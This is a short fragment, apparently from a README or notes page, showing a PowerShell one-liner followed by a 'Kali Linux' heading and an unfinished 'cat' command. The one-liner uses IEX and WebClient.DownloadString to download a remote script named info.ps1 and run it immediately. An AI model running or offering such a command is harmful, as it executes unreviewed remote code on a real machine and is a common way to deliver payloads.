...
```
powershell "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/smithbraz/windows/refs/heads/main/scripts-powershell/info.ps1')"
```
Kali Linux
```
$ cat smith
